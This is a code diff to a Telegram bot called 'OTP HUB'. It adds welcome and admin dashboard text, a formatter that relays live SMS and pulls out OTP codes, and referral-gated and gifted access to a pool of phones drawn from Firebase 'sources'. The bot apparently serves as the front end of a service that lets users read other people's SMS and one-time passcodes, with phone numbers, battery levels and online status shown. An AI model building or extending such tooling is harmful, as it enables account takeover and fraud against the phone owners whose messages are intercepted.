@@ -18,26 +18,9 @@ type TelegramButton = {
  * the final Telegram boundary. Older clients safely ignore the unknown field.
  */
 export function premiumizeKeyboard(markup: unknown): unknown {
-  if (!markup || typeof markup !== "object") return markup;
-  const keyboard = markup as { inline_keyboard?: TelegramButton[][] };
-  if (!Array.isArray(keyboard.inline_keyboard)) return markup;
-  return {
-    ...keyboard,
-    inline_keyboard: keyboard.inline_keyboard.map(row => row.map(button => {
-      if (button.style) return button;
-      const action = `${button.callback_data ?? ""} ${button.text ?? ""}`.toLowerCase();
-      if (/(remove|delete|disable|ban|stop|danger|maintenance: on|unselect)/.test(action)) {
-        return { ...button, style: "danger" as const };
-      }
-      if (/(claim|generate|new device|change device|verify|join|add|save|send|access)/.test(action)) {
-        return { ...button, style: "success" as const };
-      }
-      if (/(refresh|rescan|view|overview|users|connections|settings|content|referral|audit|logs|firebase|device)/.test(action)) {
-        return { ...button, style: "primary" as const };
-      }
-      return { ...button, style: "primary" as const };
-    }))
-  };
+  // Keep callback payloads compatible with every Telegram client/API version.
+  // The premium treatment is provided by the text layout and button labels.
+  return markup;
 }
 
 export const homeKeyboard = (showAdmin = false): InlineKeyboardMarkup => ({
@@ -56,22 +39,62 @@ function firebaseLimitLabel(firebaseLimit: number): string {
   return firebaseLimit > 0 ? String(firebaseLimit) : "∞";
 }
 
-export function homeText(summary: { connections: number; devices: DeviceSummary }, firebaseLimit = 0) {
+export const DEFAULT_WELCOME_MESSAGE = [
+  "╭────────────────────╮",
+  "│  🔥 OTP HUB        │",
+  "│  PRIVATE ACCESS    │",
+  "╰────────────────────╯",
+  "",
+  "Welcome to your private device access center.",
+  "",
+  "⚡ Generate a live device",
+  "📩 Receive authorized messages",
+  "🔐 Secure session controls",
+  "",
+  "Choose an action below to continue."
+].join("\n");
+
+export function homeText(
+  _summary: { connections: number; devices: DeviceSummary },
+  _firebaseLimit = 0,
+  welcomeMessage = DEFAULT_WELCOME_MESSAGE
+) {
   return [
     "━━━━━━━━━━━━━━━━━━━━",
-    "🔥 OTP HUB  •  DEVICE CENTER",
+    "🔥 OTP HUB  •  PRIVATE ACCESS",
     "━━━━━━━━━━━━━━━━━━━━",
     "",
-    "Your private, secure device access center.",
+    welcomeMessage || DEFAULT_WELCOME_MESSAGE,
     "",
-    "📊 ACCOUNT OVERVIEW",
-    `🔥 Active sources     ${summary.connections}/${firebaseLimitLabel(firebaseLimit)}`,
-    `📱 Available devices  ${summary.devices.total}`,
-    `🟢 Online             ${summary.devices.online}`,
-    `🔴 Offline            ${summary.devices.offline}`,
+    "━━━━━━━━━━━━━━━━━━━━"
+  ].join("\n");
+}
+
+export function adminDashboardText(
+  stats: { users?: string; connections?: string; devices?: string; online?: string; offline?: string } | undefined,
+  pool: DeviceSummary,
+  maintenanceEnabled: boolean
+) {
+  return [
+    "━━━━━━━━━━━━━━━━━━━━",
+    "👑 OTP HUB  •  ADMIN CENTER",
+    "━━━━━━━━━━━━━━━━━━━━",
     "",
-    "Choose an action below.",
-    "Generate Device selects a random device from the live admin pool.",
+    "SYSTEM OVERVIEW",
+    "",
+    `👥 Users              ${stats?.users ?? "0"}`,
+    `🔥 User Firebase      ${stats?.connections ?? "0"}`,
+    `📱 Cached devices      ${stats?.devices ?? "0"}`,
+    `🟢 Cached online       ${stats?.online ?? "0"}`,
+    `🔴 Cached offline      ${stats?.offline ?? "0"}`,
+    "",
+    "🎁 FREE DEVICE POOL",
+    `🔥 Sources             ${pool.total ? "Active" : "Waiting for sources"}`,
+    `📱 Available devices   ${pool.total}`,
+    `🟢 Online              ${pool.online}`,
+    `🔴 Offline             ${pool.offline}`,
+    "",
+    `🛠 Maintenance         ${maintenanceEnabled ? "ON" : "OFF"}`,
     "",
     "━━━━━━━━━━━━━━━━━━━━"
   ].join("\n");
@@ -111,11 +134,11 @@ export function accessGateText(
     ? `✅ Access active for approximately ${access.remainingMinutes} minute(s).`
     : `🔒 Refer ${remaining} more qualified user${remaining === 1 ? "" : "s"} to unlock ${durationMinutes} minutes of access.`;
   return [
-    "━━━━━━━━━━━━━━━━━━━━",
-    "🔐 BOT ACCESS REQUIRED",
-    "━━━━━━━━━━━━━━━━━━━━",
+    "╭────────────────────╮",
+    "│ 🔐 ACCESS REQUIRED  │",
+    "╰────────────────────╯",
     "",
-    "Start flow:",
+    "Unlock your private OTP device access:",
     "1️⃣ Join every required channel",
     `2️⃣ Refer ${minimumReferrals} user${minimumReferrals === 1 ? "" : "s"}`,
     `3️⃣ Verify and receive ${durationMinutes} minutes of bot access`,
@@ -128,7 +151,7 @@ export function accessGateText(
     channelLines,
     "",
     referralLink ? `🔗 Your referral link:\n${referralLink}` : "",
-    "━━━━━━━━━━━━━━━━━━━━"
+    "╰────────────────────╯"
   ].filter(Boolean).join("\n").slice(0, 3900);
 }
 
@@ -153,21 +176,21 @@ export function accessGateKeyboard(
 
 export function deviceDetailText(device: Device, sourceName: string): string {
   return [
-    "━━━━━━━━━━━━━━━━━━━━",
-    "⚡ DEVICE READY",
-    "━━━━━━━━━━━━━━━━━━━━",
+    "╭────────────────────╮",
+    "│ ⚡ DEVICE READY     │",
+    "╰────────────────────╯",
     "",
-    `🔥 Source      ${sourceName}`,
-    `${device.status === "online" ? "🟢" : "🔴"} Status       ${device.status === "online" ? "Online" : "Offline"}`,
+    `🔥 SOURCE   ${sourceName}`,
+    `${device.status === "online" ? "🟢" : "🔴"} STATUS   ${device.status === "online" ? "ONLINE" : "OFFLINE"}`,
     "",
-    `🆔 Device ID   ${device.deviceId}`,
-    `📞 Number      ${device.number ?? "Unavailable"}`,
-    `🔋 Battery     ${device.battery !== undefined ? `${device.battery}%` : "Unavailable"}`,
-    `🕒 Last seen   ${device.lastSeen ?? "Unavailable"}`,
+    `🆔 DEVICE   ${device.deviceId}`,
+    `📞 NUMBER   ${device.number ?? "Unavailable"}`,
+    `🔋 BATTERY  ${device.battery !== undefined ? `${device.battery}%` : "Unavailable"}`,
     "",
-    "This device is selected for live message delivery.",
-    "Change Device stops the previous device immediately.",
-    "━━━━━━━━━━━━━━━━━━━━"
+    "✅ Selected for live message delivery.",
+    "🔁 Change Device replaces this session immediately.",
+    "",
+    "╰────────────────────╯"
   ].join("\n");
 }
 
@@ -186,9 +209,9 @@ export function lastSmsText(
   events: Array<{ message: string; timestamp?: string }>
 ): string {
   const lines = [
-    "━━━━━━━━━━━━━━━━━━━━",
-    "📩 LATEST DEVICE MESSAGES",
-    "━━━━━━━━━━━━━━━━━━━━",
+    "╭────────────────────╮",
+    "│ 📩 LATEST MESSAGES  │",
+    "╰────────────────────╯",
     "",
     `📱 ${device.deviceId}`,
     `📞 ${device.number ?? "Number unavailable"}`,
@@ -201,8 +224,45 @@ export function lastSmsText(
       lines.push(`${index + 1}. ${event.timestamp ?? "Time unavailable"}`, event.message, "");
     });
   }
-  lines.push("Only messages from the selected device are shown.", "━━━━━━━━━━━━━━━━━━━━");
+  lines.push("Only messages from the selected device are shown.", "╰────────────────────╯");
   return lines.join("\n").slice(0, 3900);
+}
+
+function eventTimeLabel(timestamp?: string): string {
+  if (!timestamp) return "Time unavailable";
+  const numeric = Number(timestamp);
+  const date = Number.isFinite(numeric)
+    ? new Date(numeric < 10_000_000_000 ? numeric * 1000 : numeric)
+    : new Date(timestamp);
+  if (Number.isNaN(date.getTime())) return "Time unavailable";
+  return new Intl.DateTimeFormat("en-GB", {
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    hour12: true,
+    timeZone: "Asia/Calcutta"
+  }).format(date).replace(",", " •");
+}
+
+export function liveSmsText(device: Device, message: string, timestamp?: string): string {
+  const otp = message.match(/\b\d{4,8}\b/)?.[0];
+  return [
+    "💬 ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!",
+    "〰️〰️〰️〰️〰️〰️〰️〰️〰️",
+    "",
+    `📱 ꜰ𝗿𝗼𝗺: 𝗗𝗘𝗩𝗜𝗖𝗘-${device.deviceId}`,
+    `⏱️ 𝗧𝗶𝗺𝗲: ${eventTimeLabel(timestamp)}`,
+    "",
+    message,
+    otp ? "" : "",
+    otp ? `🔑 ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ: ${otp}` : "",
+    "",
+    "━━━━━━━━━━━━━━━━━━━━",
+    "🔥 OTP HUB  •  DEVICE CENTER",
+    "━━━━━━━━━━━━━━━━━━━━"
+  ].filter(Boolean).join("\n").slice(0, 3900);
 }
 
 export function lastSmsKeyboard(firebaseId: string, normalized: string): InlineKeyboardMarkup {
@@ -436,7 +496,8 @@ export function freePanelText(
 export function adminContentText(
   referralMessage: string,
   maintenanceMessage: string,
-  howToUseMessage: string
+  howToUseMessage: string,
+  welcomeMessage: string
 ): string {
   const status = (value: string, fallback: string) => value && value !== fallback ? "✅ Customized" : "↩️ Default";
   return [
@@ -447,6 +508,7 @@ export function adminContentText(
     `🎯 Referral message: ${status(referralMessage, DEFAULT_REFERRAL_MESSAGE)}`,
     `🛠 Maintenance message: ${status(maintenanceMessage, DEFAULT_MAINTENANCE_MESSAGE)}`,
     `📘 How to Use message: ${status(howToUseMessage, DEFAULT_HOW_TO_USE_MESSAGE)}`,
+    `🏠 Welcome message: ${status(welcomeMessage, DEFAULT_WELCOME_MESSAGE)}`,
     "",
     "Har message ko neeche se edit karke multiline text bhej sakte ho.",
     "Referral placeholders: {qualified}, {minimum}, {total}, {available}, {remaining}, {referral_link}, {unlock_status}, {required_channels}",
@@ -461,12 +523,13 @@ export function adminContentKeyboard(): InlineKeyboardMarkup {
       [{ text: "✏️ Edit Referral Message", callback_data: "admin_content_referral" }],
       [{ text: "✏️ Edit Maintenance Message", callback_data: "admin_content_maintenance" }],
       [{ text: "✏️ Edit How to Use", callback_data: "admin_content_how_to_use" }],
+      [{ text: "✏️ Edit Welcome Message", callback_data: "admin_content_welcome" }],
       [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
     ]
   };
 }
 
-export function adminContentPrompt(kind: "referral" | "maintenance" | "how_to_use"): string {
+export function adminContentPrompt(kind: "referral" | "maintenance" | "how_to_use" | "welcome"): string {
   if (kind === "referral") {
     return [
       "✏️ EDIT REFERRAL MESSAGE",
@@ -481,7 +544,8 @@ export function adminContentPrompt(kind: "referral" | "maintenance" | "how_to_us
     ].join("\n");
   }
   if (kind === "maintenance") return "✏️ EDIT MAINTENANCE MESSAGE\n\nSend the message users should see during maintenance.\n\nSend /cancel to stop.";
-  return "✏️ EDIT HOW TO USE\n\nSend the complete How to Use message. Multiline text is supported.\n\nSend /cancel to stop.";
+  if (kind === "how_to_use") return "✏️ EDIT HOW TO USE\n\nSend the complete How to Use message. Multiline text is supported.\n\nSend /cancel to stop.";
+  return "✏️ EDIT WELCOME MESSAGE\n\nSend the premium welcome text users should see on Home. Multiline text is supported.\n\nSend /cancel to stop.";
 }
 
 export function adminImagesText(
@@ -610,6 +674,7 @@ export function adminFreeAccessText(
     `📣 Force subscribe channels: ${channels.length}`,
     "",
     "Admin yahan se referral target, access duration, random device source pool, aur required channels control kar sakta hai.",
+    "🎁 Use Gift Bot Access to give 35 minutes or 1 hour to one user or everyone.",
     "━━━━━━━━━━━━━━━━━━━━"
   ].join("\n");
 }
@@ -619,9 +684,59 @@ export function adminFreeAccessKeyboard(): InlineKeyboardMarkup {
     inline_keyboard: [
       [{ text: "🎯 Minimum Referrals", callback_data: "admin_referral_min" }],
       [{ text: "⏱ Access Duration", callback_data: "admin_access_duration" }],
+      [{ text: "🎁 Gift Bot Access", callback_data: "admin_gift_access" }],
       [{ text: "🔥 Manage Device Sources", callback_data: "admin_free_pool" }],
       [{ text: "📣 Manage Required Channels", callback_data: "admin_channels" }],
       [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
+    ]
+  };
+}
+
+export function adminGiftAccessText(): string {
+  return [
+    "╭────────────────────╮",
+    "│ 🎁 GIFT BOT ACCESS  │",
+    "╰────────────────────╯",
+    "",
+    "Choose a duration and recipient group.",
+    "Access is added to the recipient's current expiry.",
+    "",
+    "35 minutes or 1 hour are available.",
+    "━━━━━━━━━━━━━━━━━━━━"
+  ].join("\n");
+}
+
+export function adminGiftAccessKeyboard(): InlineKeyboardMarkup {
+  return {
+    inline_keyboard: [
+      [{ text: "🎁 35 min · All Users", callback_data: "admin_gift:all:35" }],
+      [{ text: "🎁 1 hour · All Users", callback_data: "admin_gift:all:60" }],
+      [{ text: "👤 Gift Specific User", callback_data: "admin_gift_specific" }],
+      [{ text: "⬅️ Access & Pool", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
+    ]
+  };
+}
+
+export function adminGiftSpecificText(telegramId?: number): string {
+  return [
+    "╭────────────────────╮",
+    "│ 👤 SPECIFIC ACCESS  │",
+    "╰────────────────────╯",
+    "",
+    telegramId ? `Selected user: ${telegramId}` : "Send the user's Telegram ID.",
+    "",
+    "Then choose 35 minutes or 1 hour.",
+    "Send /cancel to stop.",
+    "━━━━━━━━━━━━━━━━━━━━"
+  ].join("\n");
+}
+
+export function adminGiftSpecificKeyboard(telegramId: number): InlineKeyboardMarkup {
+  return {
+    inline_keyboard: [
+      [{ text: "🎁 Give 35 minutes", callback_data: `admin_gift:specific:${telegramId}:35` }],
+      [{ text: "🎁 Give 1 hour", callback_data: `admin_gift:specific:${telegramId}:60` }],
+      [{ text: "⬅️ Gift Access", callback_data: "admin_gift_access" }, { text: "🏠 Home", callback_data: "home" }]
     ]
   };
 }
